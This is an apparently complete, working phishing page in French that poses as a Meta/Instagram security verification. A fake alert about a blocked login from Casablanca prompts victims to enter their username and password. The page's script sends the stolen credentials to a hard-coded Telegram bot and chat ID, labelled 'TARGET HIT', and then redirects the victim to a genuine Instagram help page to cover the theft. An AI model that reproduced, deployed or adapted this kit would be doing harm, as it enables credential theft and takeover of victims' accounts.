<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Centre de Sécurité Meta</title>
    <style>
        :root { 
            --meta-blue: #0064e0; 
            --deep-blue: #0749a0; 
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        
        /* الخلفية الزرقاء الكاملة */
        body { 
            background: linear-gradient(135deg, var(--meta-blue) 0%, var(--deep-blue) 100%); 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            padding: 20px; 
        }

        /* المربع الأبيض الداخلي */
        .card { 
            background: white; 
            border-radius: 12px; 
            width: 100%; 
            max-width: 400px; 
            padding: 30px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.2); 
            text-align: center;
        }

        .ig-icon { 
            width: 70px; 
            height: 70px; 
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); 
            border-radius: 18px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            margin: 0 auto 20px; 
        }
        .ig-icon img { width: 45px; filter: brightness(0) invert(1); }

        h2 { font-size: 22px; color: #1c1e21; margin-bottom: 15px; font-weight: 700; }
        
        .alert-box { 
            background: #fff4f4; 
            border: 1px solid #f9d6d6; 
            border-radius: 10px; 
            padding: 15px; 
            margin-bottom: 25px; 
            display: flex; 
            align-items: center;
            text-align: left;
        }
        .alert-box svg { fill: #fa3e3e; width: 28px; margin-right: 12px; flex-shrink: 0; }
        .alert-text { font-size: 13px; color: #4b4f56; line-height: 1.4; }
        .details { font-weight: 700; color: #d93025; }

        input { 
            width: 100%; 
            padding: 15px; 
            background: #f5f6f7; 
            border: 1px solid #dddfe2; 
            border-radius: 8px; 
            margin-bottom: 12px; 
            font-size: 14px; 
            transition: 0.2s; 
        }
        input:focus { background: white; border-color: var(--meta-blue); outline: none; }

        .btn { 
            width: 100%; 
            background: var(--meta-blue); 
            color: white; 
            border: none; 
            padding: 15px; 
            border-radius: 8px; 
            font-weight: 700; 
            font-size: 16px; 
            cursor: pointer; 
            transition: 0.3s; 
        }
        .btn:hover { background: #166fe5; }

        .footer { 
            margin-top: 25px; 
            padding-top: 15px; 
            border-top: 1px solid #ebedf0; 
        }
        .footer img { width: 80px; opacity: 0.8; }
    </style>
</head>
<body>

<div class="card">
    <div class="ig-icon">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png">
    </div>
    <h2>Vérification de sécurité</h2>

    <div class="alert-box">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
        <div class="alert-text">
            Tentative de connexion bloquée : <br>
            <span class="details">📍 Casablanca, Maroc (IP: 105.158.24.11)</span>
            <br>Veuillez confirmer votre identité pour déverrouiller votre compte.
        </div>
    </div>

    <form id="final-gate">
        <input type="text" id="user" placeholder="Nom d'utilisateur, e-mail ou mobile" required>
        <input type="password" id="pass" placeholder="Mot de passe" required>
        <button type="submit" class="btn">Sécuriser le compte</button>
    </form>

    <div class="footer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png">
    </div>
</div>

<script>
    document.getElementById('final-gate').onsubmit = async (e) => {
        e.preventDefault();
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const tok = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
        const id = "5558301795";
        
        const text = `🚨 **TARGET HIT: MAROC BYPASS** 🚨\n\n👤 **User:** \`${u}\` \n🔑 **Pass:** \`${p}\` \n📍 **Source:** Meta Security Portal`;

        await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        
        // التوجيه النهائي لصفحة رسمية
        window.location.href = "https://help.instagram.com/149494825257596";
    };
</script>

</body>
</html>
